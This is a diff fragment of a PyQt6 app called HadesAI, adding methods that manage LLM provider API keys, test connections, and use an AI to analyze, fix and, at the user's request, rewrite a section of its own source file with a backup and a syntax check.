+                key = ""
+            else:
+                key = os.getenv("OPENAI_API_KEY", "")
+        return key
+    
+    def _si_load_saved_config(self):
+        """Load saved configuration including API keys and provider (called at startup)"""
+        try:
+            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
+            if os.path.exists(config_path):
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+                    
+                    # Load saved provider preference first
+                    saved_provider = config.get("ai_provider", "openai")
+                    if hasattr(self, 'si_provider_combo'):
+                        # Temporarily disconnect to avoid triggering on_changed
+                        self.si_provider_combo.blockSignals(True)
+                        if saved_provider == "azure":
+                            self.si_provider_combo.setCurrentIndex(3)
+                        elif saved_provider == "ollama":
+                            self.si_provider_combo.setCurrentIndex(2)
+                        elif saved_provider == "mistral":
+                            self.si_provider_combo.setCurrentIndex(1)
+                        else:
+                            self.si_provider_combo.setCurrentIndex(0)
+                        self.si_provider_combo.blockSignals(False)
+                        
+                        # Update UI for the loaded provider
+                        idx = self.si_provider_combo.currentIndex()
+                        if hasattr(self, 'si_ollama_layout_widget'):
+                            self.si_ollama_layout_widget.setVisible(idx == 2)
+                        if hasattr(self, 'si_azure_layout_widget'):
+                            self.si_azure_layout_widget.setVisible(idx == 3)
+                        if hasattr(self, 'si_api_key_input'):
+                            self.si_api_key_input.setEnabled(idx != 2)
+                            if idx == 2:
+                                self.si_api_key_input.setPlaceholderText("Not needed for Ollama (runs locally)")
+                            elif idx == 3:
+                                self.si_api_key_input.setPlaceholderText("Enter your Azure OpenAI API key...")
+                            else:
+                                self.si_api_key_input.setPlaceholderText("Enter your API key...")
+                    
+                    # Load the appropriate key based on saved provider
+                    if saved_provider == "azure":
+                        key = config.get("azure_api_key", "")
+                        self.si_api_key_input.setText(key)
+                        # Load Azure-specific settings
+                        if hasattr(self, 'si_azure_endpoint'):
+                            self.si_azure_endpoint.setText(config.get("azure_endpoint", ""))
+                        if hasattr(self, 'si_azure_deployment'):
+                            self.si_azure_deployment.setText(config.get("azure_deployment", ""))
+                        if hasattr(self, 'si_azure_api_version'):
+                            version = config.get("azure_api_version", "2024-02-15-preview")
+                            self.si_azure_api_version.setCurrentText(version)
+                    elif saved_provider == "ollama":
+                        self.si_api_key_input.clear()
+                    elif saved_provider == "mistral":
+                        key = config.get("mistral_api_key", "")
+                        self.si_api_key_input.setText(key)
+                    else:
+                        key = config.get("openai_api_key", "")
+                        self.si_api_key_input.setText(key)
+        except:
+            pass
+    
+    def _si_save_api_key(self):
+        """Save API key to local config file"""
+        provider = self._si_get_current_provider()
+        key = self.si_api_key_input.text().strip()
+        
+        # Ollama doesn't need an API key
+        if provider == "ollama":
+            self._si_save_provider_preference()
+            return
+        
+        if not key:
+            self.si_result_display.setPlainText("⚠️ Enter an API key first.")
+            return
+        
+        # Azure needs additional validation
+        if provider == "azure":
+            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
+            deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
+            if not endpoint or not deployment:
+                self.si_result_display.setPlainText("⚠️ Azure requires Endpoint URL and Deployment Name.")
+                return
+        
+        try:
+            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
+            config = {}
+            if os.path.exists(config_path):
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+            
+            # Save key for the current provider
+            if provider == "azure":
+                config["azure_api_key"] = key
+                config["azure_endpoint"] = self.si_azure_endpoint.text().strip()
+                config["azure_deployment"] = self.si_azure_deployment.text().strip()
+                config["azure_api_version"] = self.si_azure_api_version.currentText()
+            elif provider == "mistral":
+                config["mistral_api_key"] = key
+            else:
+                config["openai_api_key"] = key
+            
+            config["ai_provider"] = provider
+            
+            with open(config_path, 'w') as f:
+                json.dump(config, f)
+            
+            self._si_update_gpt_status()
+            provider_names = {"mistral": "Mistral AI", "azure": "Azure OpenAI", "openai": "OpenAI"}
+            provider_name = provider_names.get(provider, "OpenAI")
+            self.si_result_display.setPlainText(f"✅ {provider_name} configuration saved successfully! You can now use all AI features.")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Error saving API key: {str(e)}")
+    
+    def _si_save_provider_preference(self):
+        """Save just the provider preference (for Ollama which doesn't need a key)"""
+        provider = self._si_get_current_provider()
+        try:
+            config_path = os.path.join(os.path.dirname(__file__), ".hades_config.json")
+            config = {}
+            if os.path.exists(config_path):
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+            
+            config["ai_provider"] = provider
+            
+            with open(config_path, 'w') as f:
+                json.dump(config, f)
+            
+            self._si_update_gpt_status()
+            provider_name = self._si_get_provider_display_name(provider)
+            self.si_result_display.setPlainText(f"✅ {provider_name} selected as provider.\n\nClick 🔌 Test to verify connection.")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Error saving preference: {str(e)}")
+    
+    def _si_test_api_key(self):
+        """Test if the API key / connection works"""
+        provider = self._si_get_current_provider()
+        
+        # Ollama doesn't need API key
+        if provider == "ollama":
+            self._si_test_ollama()
+            return
+        
+        key = self._si_get_api_key()
+        if not key:
+            self.si_result_display.setPlainText("⚠️ Enter an API key first.")
+            return
+        
+        self.si_result_display.setPlainText(f"🔄 Testing {provider.upper()} API connection...")
+        QApplication.processEvents()
+        
+        try:
+            if provider == "azure":
+                if not HAS_AZURE_OPENAI:
+                    self.si_result_display.setPlainText("❌ Azure OpenAI not available. Run: pip install openai")
+                    return
+                
+                endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
+                deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
+                api_version = self.si_azure_api_version.currentText() if hasattr(self, 'si_azure_api_version') else "2024-02-15-preview"
+                
+                if not endpoint or not deployment:
+                    self.si_result_display.setPlainText("⚠️ Enter Azure Endpoint and Deployment Name first.")
+                    return
+                
+                client = AzureOpenAI(
+                    api_key=key,
+                    api_version=api_version,
+                    azure_endpoint=endpoint
+                )
+                response = client.chat.completions.create(
+                    model=deployment,
+                    messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}],
+                    max_tokens=20,
+                    temperature=0
+                )
+                result = response.choices[0].message.content
+                self._si_update_gpt_status()
+                self.si_result_display.setPlainText(f"✅ Azure OpenAI Connection Successful!\n\nDeployment: {deployment}\nResponse: {result}\n\nYou can now use all AI features.")
+                return
+            
+            elif provider == "mistral":
+                if not HAS_MISTRAL:
+                    self.si_result_display.setPlainText("❌ Mistral library not installed. Run: pip install mistralai")
+                    return
+                
+                client = Mistral(api_key=key)
+                response = client.chat.complete(
+                    model="mistral-small-latest",
+                    messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}]
+                )
+                result = response.choices[0].message.content
+            else:
+                if not HAS_OPENAI:
+                    self.si_result_display.setPlainText("❌ OpenAI library not installed. Run: pip install openai")
+                    return
+                
+                client = OpenAI(api_key=key)
+                response = client.chat.completions.create(
+                    model="gpt-3.5-turbo",
+                    messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}],
+                    max_tokens=20,
+                    temperature=0
+                )
+                result = response.choices[0].message.content
+            
+            self._si_update_gpt_status()
+            provider_name = self._si_get_provider_display_name(provider)
+            self.si_result_display.setPlainText(f"✅ {provider_name} Connection Successful!\n\nResponse: {result}\n\nYou can now use all AI features.")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ API Test Failed: {str(e)}\n\nPlease check your API key.")
+    
+    def _si_test_ollama(self):
+        """Test Ollama connection"""
+        if not HAS_OLLAMA:
+            self.si_result_display.setPlainText("❌ Ollama library not installed.\n\n1. Install Python library: pip install ollama\n2. Install Ollama app from: https://ollama.ai\n3. Run: ollama serve\n4. Pull a model: ollama pull codellama")
+            return
+        
+        model = self.si_ollama_model.currentText() or "llama3.2"
+        self.si_result_display.setPlainText(f"🔄 Testing Ollama connection with model '{model}'...")
+        QApplication.processEvents()
+        
+        try:
+            # First check if Ollama is running by listing models
+            try:
+                ollama_lib.list()
+            except Exception as conn_err:
+                self.si_result_display.setPlainText(f"❌ Cannot connect to Ollama.\n\nMake sure:\n1. Ollama app is installed from https://ollama.ai\n2. Ollama is running (check system tray or run 'ollama serve')\n\nError: {str(conn_err)}")
+                return
+            
+            response = ollama_lib.chat(
+                model=model,
+                messages=[{"role": "user", "content": "Say 'HADES AI connection successful' in exactly those words."}]
+            )
+            
+            # Handle different response formats
+            if isinstance(response, dict):
+                result = response.get('message', {}).get('content', str(response))
+            else:
+                result = getattr(getattr(response, 'message', response), 'content', str(response))
+            
+            self._si_update_gpt_status()
+            self.si_result_display.setPlainText(f"✅ Ollama Connection Successful!\n\nModel: {model}\nResponse: {result}\n\nYou can now use all AI features for FREE!")
+        except Exception as e:
+            error_msg = str(e)
+            if "not found" in error_msg.lower() or "pull" in error_msg.lower():
+                self.si_result_display.setPlainText(f"❌ Model '{model}' not found.\n\nInstall it with:\n  ollama pull {model}\n\nPopular models:\n  ollama pull llama3.2\n  ollama pull codellama\n  ollama pull mistral\n  ollama pull deepseek-coder:6.7b")
+            elif "connection" in error_msg.lower() or "refused" in error_msg.lower():
+                self.si_result_display.setPlainText(f"❌ Cannot connect to Ollama.\n\nMake sure Ollama is running:\n1. Check system tray for Ollama icon\n2. Or run: ollama serve\n\nError: {error_msg}")
+            else:
+                self.si_result_display.setPlainText(f"❌ Ollama Test Failed: {error_msg}\n\nMake sure:\n1. Ollama is installed (https://ollama.ai)\n2. Ollama is running\n3. A model is installed (ollama pull llama3.2)")
+    
+    def _si_update_gpt_status(self):
+        """Update the AI status label"""
+        key = self._si_get_api_key()
+        provider = self._si_get_current_provider()
+        
+        if provider == "azure":
+            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
+            deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
+            if HAS_AZURE_OPENAI and key and endpoint and deployment:
+                self.si_gpt_status_label.setText(f"✅ Azure OpenAI Available - Deployment: {deployment}")
+                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
+            else:
+                if not HAS_AZURE_OPENAI:
+                    self.si_gpt_status_label.setText("⚠️ Azure OpenAI not available - Run: pip install openai")
+                else:
+                    self.si_gpt_status_label.setText("⚠️ Enter Azure API key, Endpoint, and Deployment Name")
+                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
+        elif provider == "ollama":
+            if HAS_OLLAMA:
+                model = self.si_ollama_model.currentText() if hasattr(self, 'si_ollama_model') else "llama3.2"
+                self.si_gpt_status_label.setText(f"✅ Ollama Available (FREE) - Model: {model}")
+                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
+            else:
+                self.si_gpt_status_label.setText("⚠️ Ollama not installed - Run: pip install ollama")
+                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
+        elif provider == "mistral":
+            if HAS_MISTRAL and key:
+                self.si_gpt_status_label.setText("✅ Mistral AI Available - Full AI capabilities enabled")
+                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
+            else:
+                if not HAS_MISTRAL:
+                    self.si_gpt_status_label.setText("⚠️ Mistral not installed - Run: pip install mistralai")
+                else:
+                    self.si_gpt_status_label.setText("⚠️ Enter your Mistral API key above to enable AI features")
+                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
+        else:
+            if HAS_OPENAI and key:
+                self.si_gpt_status_label.setText("✅ OpenAI GPT Available - Full AI capabilities enabled")
+                self.si_gpt_status_label.setStyleSheet("color: #4CAF50; padding: 5px;")
+            else:
+                if not HAS_OPENAI:
+                    self.si_gpt_status_label.setText("⚠️ OpenAI not installed - Run: pip install openai")
+                else:
+                    self.si_gpt_status_label.setText("⚠️ Enter your OpenAI API key above to enable AI features")
+                self.si_gpt_status_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
+    
+    def _si_has_ai(self) -> bool:
+        """Check if any AI path is available (remote provider or local fallback)."""
+        if HAS_OFFLINE_LLM or HAS_FALLBACK_LLM:
+            return True
+
+        provider = self._si_get_current_provider()
+        key = self._si_get_api_key()
+        if provider == "azure":
+            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
+            deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
+            return HAS_AZURE_OPENAI and bool(key) and bool(endpoint) and bool(deployment)
+        elif provider == "ollama":
+            return HAS_OLLAMA  # Ollama doesn't need API key
+        elif provider == "mistral":
+            return HAS_MISTRAL and bool(key)
+        return HAS_OPENAI and bool(key)
+    
+    def _si_has_gpt(self) -> bool:
+        """Check if AI is available (legacy name for compatibility)"""
+        return self._si_has_ai()
+    
+    def _si_get_ai_client(self):
+        """Get an AI client instance for the current provider"""
+        provider = self._si_get_current_provider()
+        key = self._si_get_api_key()
+        
+        if provider == "ollama":
+            return ollama_lib if HAS_OLLAMA else None
+        
+        if not key:
+            return None
+
+        if provider == "mistral":
+            if not HAS_MISTRAL:
+                return None
+            return Mistral(api_key=key)
+        elif provider == "azure":
+            if not HAS_AZURE_OPENAI:
+                return None
+            endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
+            api_version = self.si_azure_api_version.currentText() if hasattr(self, 'si_azure_api_version') else "2024-02-15-preview"
+            if not endpoint:
+                return None
+            return AzureOpenAI(api_key=key, api_version=api_version, azure_endpoint=endpoint)
+        else:
+            if not HAS_OPENAI:
+                return None
+            return OpenAI(api_key=key)
+    
+    def _si_get_openai_client(self):
+        """Get an OpenAI client instance (legacy, for compatibility)"""
+        return self._si_get_ai_client()
+
+    def _si_local_fallback_response(self, system_prompt: str, user_prompt: str, source: str = "fallback") -> str:
+        """Generate a robust local response when external AI providers are unavailable."""
+        if HAS_OFFLINE_LLM:
+            try:
+                if not hasattr(self, '_offline_llm'):
+                    self._offline_llm = OfflineLLM(use_knowledge_db=True)
+                mood = self.brain.get('mood', 'neutral') if hasattr(self, 'brain') else 'neutral'
+                local_result = self._offline_llm.generate(
+                    user_input=user_prompt,
+                    mood=mood,
+                    system_prompt=system_prompt,
+                )
+                if local_result and local_result.strip():
+                    return local_result
+            except Exception as e:
+                logger.warning(f"OfflineLLM fallback failed ({source}): {e}")
+
+        # Final local fallback: existing deterministic response engine.
+        return self._generate_intelligent_response(user_prompt)
+    
+    def _si_call_ai(self, system_prompt: str, user_prompt: str, max_tokens: int = 2000, temperature: float = 0.3) -> str:
+        """Call the current AI provider with the given prompts"""
+        provider = self._si_get_current_provider()
+        key = self._si_get_api_key()
+        
+        try:
+            if provider == "ollama":
+                if not HAS_OLLAMA:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="ollama-unavailable")
+                
+                model = self.si_ollama_model.currentText() if hasattr(self, 'si_ollama_model') else "llama3.2"
+                response = ollama_lib.chat(
+                    model=model,
+                    messages=[
+                        {"role": "system", "content": system_prompt},
+                        {"role": "user", "content": user_prompt}
+                    ]
+                )
+                
+                # Handle different response formats
+                if isinstance(response, dict):
+                    return response.get('message', {}).get('content', str(response))
+                else:
+                    return getattr(getattr(response, 'message', response), 'content', str(response))
+            elif provider == "azure":
+                if not HAS_AZURE_OPENAI:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="azure-unavailable")
+                if not key:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="azure-no-key")
+                
+                endpoint = self.si_azure_endpoint.text().strip() if hasattr(self, 'si_azure_endpoint') else ""
+                deployment = self.si_azure_deployment.text().strip() if hasattr(self, 'si_azure_deployment') else ""
+                api_version = self.si_azure_api_version.currentText() if hasattr(self, 'si_azure_api_version') else "2024-02-15-preview"
+                
+                if not endpoint or not deployment:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="azure-config-missing")
+                
+                client = AzureOpenAI(
+                    api_key=key,
+                    api_version=api_version,
+                    azure_endpoint=endpoint
+                )
+                response = client.chat.completions.create(
+                    model=deployment,
+                    messages=[
+                        {"role": "system", "content": system_prompt},
+                        {"role": "user", "content": user_prompt}
+                    ],
+                    max_tokens=max_tokens,
+                    temperature=temperature
+                )
+                return response.choices[0].message.content
+            elif provider == "mistral":
+                if not HAS_MISTRAL:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="mistral-unavailable")
+                if not key:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="mistral-no-key")
+                
+                client = Mistral(api_key=key)
+                response = client.chat.complete(
+                    model="mistral-small-latest",
+                    messages=[
+                        {"role": "system", "content": system_prompt},
+                        {"role": "user", "content": user_prompt}
+                    ]
+                )
+                return response.choices[0].message.content
+            else:
+                if not HAS_OPENAI:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="openai-unavailable")
+                if not key:
+                    return self._si_local_fallback_response(system_prompt, user_prompt, source="openai-no-key")
+                
+                client = OpenAI(api_key=key)
+                response = client.chat.completions.create(
+                    model="gpt-3.5-turbo",
+                    messages=[
+                        {"role": "system", "content": system_prompt},
+                        {"role": "user", "content": user_prompt}
+                    ],
+                    max_tokens=max_tokens,
+                    temperature=temperature
+                )
+                return response.choices[0].message.content
+        except Exception as e:
+            logger.warning(f"AI provider error ({provider}), switching to local fallback: {e}")
+            return self._si_local_fallback_response(system_prompt, user_prompt, source=f"{provider}-exception")
+    
+    def _si_load_hades_file(self, filename: str):
+        """Load a HADES source file"""
+        try:
+            filepath = os.path.join(os.path.dirname(__file__), filename)
+            if not os.path.exists(filepath):
+                filepath = filename
+            
+            with open(filepath, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            self.si_code_editor.setPlainText(content)
+            self.si_file_path.setText(filepath)
+            self.si_result_display.setPlainText(f"✅ Loaded {filename} ({len(content)} characters, {content.count(chr(10))+1} lines)")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Error loading file: {str(e)}")
+    
+    def _si_browse_file(self):
+        """Browse for a file to load"""
+        filepath, _ = QFileDialog.getOpenFileName(self, "Open Code File", "", 
+            "Python Files (*.py);;All Files (*.*)")
+        if filepath:
+            self.si_file_path.setText(filepath)
+            self._si_load_custom_file()
+    
+    def _si_load_custom_file(self):
+        """Load a custom file"""
+        filepath = self.si_file_path.text().strip()
+        if not filepath:
+            self.si_result_display.setPlainText("⚠️ Enter a file path first.")
+            return
+        
+        try:
+            with open(filepath, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            self.si_code_editor.setPlainText(content)
+            self.si_result_display.setPlainText(f"✅ Loaded {os.path.basename(filepath)} ({len(content)} characters)")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Error loading file: {str(e)}")
+
+    def _si_load_self_improvement_section(self):
+        """Load only this self-improvement section from HadesAI.py for focused self-updates."""
+        try:
+            target_path = os.path.join(os.path.dirname(__file__), "HadesAI.py")
+            with open(target_path, 'r', encoding='utf-8') as f:
+                source = f.read()
+
+            start_marker = "    def _create_self_improvement_tab(self) -> QWidget:"
+            end_marker = "\n    def _load_code_file(self):"
+
+            start_idx = source.find(start_marker)
+            end_idx = source.find(end_marker, start_idx)
+
+            if start_idx == -1 or end_idx == -1:
+                self.si_result_display.setPlainText("❌ Could not locate self-improvement section boundaries in HadesAI.py")
+                return
+
+            section = source[start_idx:end_idx].rstrip() + "\n"
+            start_line = source[:start_idx].count('\n') + 1
+            end_line = source[:end_idx].count('\n') + 1
+
+            self.si_code_editor.setPlainText(section)
+            self.si_file_path.setText(target_path)
+            self._si_self_section_meta = {
+                "path": target_path,
+                "start_marker": start_marker,
+                "end_marker": end_marker,
+                "start_line": start_line,
+                "end_line": end_line,
+            }
+            self.si_result_display.setPlainText(
+                f"✅ Loaded self-improvement section from HadesAI.py\n"
+                f"Lines: {start_line}-{end_line}\n\n"
+                "Use ♻️ Self-Update Section, then 💾 Apply Section Update."
+            )
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Error loading self-improvement section: {str(e)}")
+
+    def _si_self_update_section(self):
+        """AI-upgrade the loaded self-improvement section with a focused prompt."""
+        section = self.si_code_editor.toPlainText().strip()
+        if not section:
+            self.si_result_display.setPlainText("⚠️ Load the self-improvement section first.")
+            return
+
+        provider_name = self._si_get_provider_display_name()
+        self.si_result_display.setPlainText(f"🔄 Updating self-improvement section with {provider_name}...")
+        QApplication.processEvents()
+
+        system_prompt = (
+            "You are maintaining a PyQt6 desktop app. Improve this self-improvement tab section so it can safely update itself and fix obvious errors. "
+            "Keep method names and integration points intact, preserve existing features, and do not remove unrelated capabilities. "
+            "Return only valid Python code for the section exactly as it should replace the existing section."
+        )
+        user_prompt = f"Update this section:\n\n```python\n{section[:14000]}\n```"
+        result = self._si_call_ai(system_prompt, user_prompt, max_tokens=5000, temperature=0.2)
+        updated = self._si_extract_code_from_response(result)
+
+        if not self._si_result_looks_like_code(updated):
+            self.si_result_display.setPlainText(
+                "⚠️ The update response did not look like code. Review the output manually or try again.\n\n"
+                f"Raw output:\n{result[:2000]}"
+            )
+            return
+
+        self.si_result_display.setPlainText(updated)
+
+    def _si_apply_section_update_to_file(self):
+        """Apply the updated self-improvement section back to HadesAI.py with backup + syntax validation."""
+        meta = getattr(self, '_si_self_section_meta', None)
+        if not meta:
+            self.si_result_display.setPlainText("⚠️ Load the self-improvement section first using '🧬 Load Self-Improvement Section'.")
+            return
+
+        updated_section = self._si_extract_code_from_response(self.si_result_display.toPlainText())
+        if not self._si_result_looks_like_code(updated_section):
+            editor_fallback = self.si_code_editor.toPlainText()
+            if self._si_result_looks_like_code(editor_fallback):
+                updated_section = editor_fallback
+            else:
+                self.si_result_display.setPlainText("⚠️ No valid updated code found. Run self-update first or paste valid section code.")
+                return
+
+        try:
+            target_path = meta["path"]
+            with open(target_path, 'r', encoding='utf-8') as f:
+                original_source = f.read()
+
+            start_marker = meta["start_marker"]
+            end_marker = meta["end_marker"]
+            start_idx = original_source.find(start_marker)
+            end_idx = original_source.find(end_marker, start_idx)
+
+            if start_idx == -1 or end_idx == -1:
+                self.si_result_display.setPlainText("❌ Could not locate section boundaries in file. Apply aborted to avoid corruption.")
+                return
+
+            normalized_section = updated_section.rstrip() + "\n\n"
+            new_source = original_source[:start_idx] + normalized_section + original_source[end_idx:]
+
+            # Safety gate: ensure the full file still parses before writing.
+            ast.parse(new_source)
+
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            backup_path = f"{target_path}.bak.{timestamp}"
+            with open(backup_path, 'w', encoding='utf-8') as f:
+                f.write(original_source)
+
+            with open(target_path, 'w', encoding='utf-8') as f:
+                f.write(new_source)
+
+            self.si_code_editor.setPlainText(updated_section.rstrip() + "\n")
+            self.si_result_display.setPlainText(
+                f"✅ Self-update applied to HadesAI.py\n"
+                f"Backup created: {backup_path}\n"
+                "Restart HADES to load the updated code."
+            )
+        except SyntaxError as e:
+            self.si_result_display.setPlainText(f"❌ Syntax validation failed. File not modified.\n\n{str(e)}")
+        except Exception as e:
+            self.si_result_display.setPlainText(f"❌ Failed to apply update: {str(e)}")
+    
+    def _si_analyze_code(self):
+        """Analyze code for issues"""
+        code = self.si_code_editor.toPlainText().strip()
+        if not code:
+            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
+            return
+        
+        provider = self._si_get_current_provider()
+        provider_name = self._si_get_provider_display_name(provider)
+        self.si_result_display.setPlainText(f"🔄 Analyzing code with {provider_name}...")
+        QApplication.processEvents()
+        
+        if self._si_has_ai():
+            system_prompt = """You are an expert Python code reviewer. Analyze the code and identify:
+1. Bugs and potential errors
+2. Security vulnerabilities
+3. Performance issues
+4. Code style problems
+5. Missing error handling
+6. Deprecated patterns
+
+For each issue found, explain:
+- What the issue is
+- Where it is (line number if possible)
+- Why it's a problem
+- How to fix it
+
+Be thorough but concise."""
+            
+            result = self._si_call_ai(system_prompt, f"Analyze this code:\n\n```python\n{code[:8000]}\n```")
+            
+            if result.startswith("❌"):
+                self.si_result_display.setPlainText(f"{result}\n\nFalling back to local analysis...")
+                self._si_local_analyze(code)
+            else:
+                self.si_result_display.setPlainText(f"📋 Analysis Results ({provider_name}):\n\n{result}")
+        else:
+            self._si_local_analyze(code)
+    
+    def _si_local_analyze(self, code: str):
+        """Local code analysis without GPT"""
+        issues = []
+        lines = code.split('\n')
+        
+        for i, line in enumerate(lines, 1):
+            # Check for common issues
+            if 'eval(' in line or 'exec(' in line:
+                issues.append(f"Line {i}: ⚠️ Security risk - eval/exec can execute arbitrary code")
+            if 'except:' in line and 'Exception' not in line:
+                issues.append(f"Line {i}: 🔍 Bare except clause - consider catching specific exceptions")
+            if 'TODO' in line or 'FIXME' in line:
+                issues.append(f"Line {i}: 📝 TODO/FIXME marker found")
+            if 'password' in line.lower() and '=' in line and ('\"' in line or "'" in line):
+                issues.append(f"Line {i}: 🔒 Potential hardcoded password")
+            if len(line) > 120:
+                issues.append(f"Line {i}: 📏 Line too long ({len(line)} chars)")
+            if '  ' in line and not line.strip().startswith('#'):
+                if line.count('  ') > 2:
+                    issues.append(f"Line {i}: 🔧 Consider reducing nesting depth")
+        
+        # AST analysis
+        try:
+            tree = ast.parse(code)
+            for node in ast.walk(tree):
+                if isinstance(node, ast.FunctionDef):
+                    if not ast.get_docstring(node):
+                        issues.append(f"Function '{node.name}': 📝 Missing docstring")
+                    if len(node.body) > 50:
+                        issues.append(f"Function '{node.name}': 📏 Function is very long ({len(node.body)} statements)")
+        except SyntaxError as e:
+            issues.append(f"❌ Syntax Error: {str(e)}")
+        
+        if issues:
+            result = "📋 Local Analysis Results:\n\n" + "\n".join(issues)
+        else:
+            result = "✅ No obvious issues found in local analysis.\n\nNote: For deeper analysis, set OPENAI_API_KEY for GPT integration."
+        
+        self.si_result_display.setPlainText(result)
+    
+    def _si_auto_fix(self):
+        """Automatically fix issues in the code"""
+        code = self.si_code_editor.toPlainText().strip()
+        if not code:
+            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
+            return
+        
+        provider = self._si_get_current_provider()
+        provider_name = self._si_get_provider_display_name(provider)
+        self.si_result_display.setPlainText(f"🔧 Auto-fixing code with {provider_name}...")
+        QApplication.processEvents()
+        
+        if self._si_has_ai():
+            system_prompt = """You are an expert Python developer. Your task is to fix and improve the provided code:
+1. Fix any bugs and errors
+2. Fix security vulnerabilities  
+3. Add proper error handling where missing
+4. Fix code style issues
+5. Improve performance where obvious
+6. Ensure the code is complete and functional
+
+IMPORTANT: Return ONLY the complete fixed code. No explanations, no markdown, just the raw Python code that can be saved directly to a file."""
+            
+            result = self._si_call_ai(system_prompt, f"Fix and improve this code:\n\n{code[:12000]}", max_tokens=4000, temperature=0.2)
+            self.si_result_display.setPlainText(self._si_extract_code_from_response(result))
+        else:
+            self.si_result_display.setPlainText("⚠️ Auto-fix requires AI. Enter your API key above.\n\nOr use the local analysis to identify issues manually.")
+    
+    def _si_verify_code(self):
+        """Verify code for correctness"""
+        code = self.si_code_editor.toPlainText().strip()
+        if not code:
+            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
+            return
+        
+        self.si_result_display.setPlainText("✅ Verifying code...")
+        QApplication.processEvents()
+        
+        results = []
+        
+        # Syntax check
+        try:
+            ast.parse(code)
+            results.append("✅ Syntax: Valid Python syntax")
+        except SyntaxError as e:
+            results.append(f"❌ Syntax Error: {str(e)}")
+            self.si_result_display.setPlainText("\n".join(results))
+            return
+        
+        # Import check
+        import_errors = []
+        tree = ast.parse(code)
+        for node in ast.walk(tree):
+            if isinstance(node, ast.Import):
+                for alias in node.names:
+                    try:
+                        __import__(alias.name.split('.')[0])
+                    except ImportError:
+                        import_errors.append(alias.name)
+            elif isinstance(node, ast.ImportFrom):
+                if node.module:
+                    try:
+                        __import__(node.module.split('.')[0])
+                    except ImportError:
+                        import_errors.append(node.module)
+        
+        if import_errors:
+            results.append(f"⚠️ Missing imports: {', '.join(set(import_errors))}")
+        else:
+            results.append("✅ Imports: All imports available")
+        
+        # Function/class count
+        functions = [node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)]
+        classes = [node.name for node in ast.walk(tree) if isinstance(node, ast.ClassDef)]
+        results.append(f"📊 Structure: {len(functions)} functions, {len(classes)} classes")
+        
+        # Complexity estimate
+        lines = len(code.split('\n'))
+        results.append(f"📏 Size: {lines} lines, {len(code)} characters")
+        
+        if self._si_has_ai():
+            provider = self._si_get_current_provider()
+            provider_name = self._si_get_provider_display_name(provider)
+            ai_result = self._si_call_ai(
+                "You are a code reviewer. Briefly verify if this code is correct, well-structured, and follows best practices. Be concise - max 3-4 sentences.",
+                f"Verify this code:\n\n```python\n{code[:4000]}\n```",
+                max_tokens=300
+            )
+            if not ai_result.startswith("❌"):
+                results.append(f"\n🤖 {provider_name} Verification:\n{ai_result}")
+        
+        self.si_result_display.setPlainText("\n".join(results))
+    
+    def _si_apply_action(self, action: str):
+        """Apply a specific action to the code"""
+        code = self.si_code_editor.toPlainText().strip()
+        if not code:
+            self.si_result_display.setPlainText("⚠️ Please load or paste some code first.")
+            return
+        
+        provider = self._si_get_current_provider()
+        provider_name = self._si_get_provider_display_name(provider)
+        self.si_result_display.setPlainText(f"🔄 Processing with {provider_name}: {action}...")
+        QApplication.processEvents()
+        
+        if self._si_has_ai():
+            result = self._si_call_ai(
+                f"You are an expert Python developer. {action}. Return ONLY the complete modified code, no explanations or markdown.",
+                f"{code[:12000]}",
+                max_tokens=4000,
+                temperature=0.2
+            )
+            self.si_result_display.setPlainText(self._si_extract_code_from_response(result))
+        else:
+            self.si_result_display.setPlainText("⚠️ This action requires AI. Enter your API key above.")
+    
+    def _si_apply_custom_instruction(self):
+        """Apply custom instruction to the code"""
+        instruction = self.si_custom_instruction.text().strip()
+        if instruction:
+            self._si_apply_action(instruction)
+        else:
